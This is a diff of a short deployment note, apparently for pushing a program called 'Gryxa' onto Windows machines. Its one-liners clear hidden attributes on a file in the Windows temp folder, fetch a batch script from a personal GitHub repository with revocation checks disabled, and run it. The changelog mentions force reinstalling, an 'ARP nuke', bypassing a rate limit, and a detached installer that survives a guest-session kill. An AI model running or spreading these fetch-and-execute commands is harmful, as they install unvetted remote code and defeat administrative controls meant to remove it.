@@ -1,8 +1,8 @@
-UNIVERSAL DEPLOY (O45 / M32 / L21 ? fix stuck registered Gryxa):
+UNIVERSAL DEPLOY (O46 / M32 / L22 ? detached install, 10s-kill safe):
 
-attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o45" & findstr /C:"OWN BUILD 20260802O45" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o46" & findstr /C:"OWN BUILD 20260802O46" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
 SHA-pin:
-attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/a30ec01e334e66cdc7af5046b81b5b98d0f35b3a/own.txt" & findstr /C:"OWN BUILD 20260802O45" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/a068e8f9a1acda35c440d108987e8291e38877b2/own.txt" & findstr /C:"OWN BUILD 20260802O46" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
-O45: Gryxa registered-but-broken (no svc/dir) -> /fa, ARP nuke, same-FP reinstall; bypass rate-limit.
+O46: stuck Gryxa no longer uses /fa. ARP nuke + detached msiexec /i survives the Guest 10s kill; next tick confirms Running.
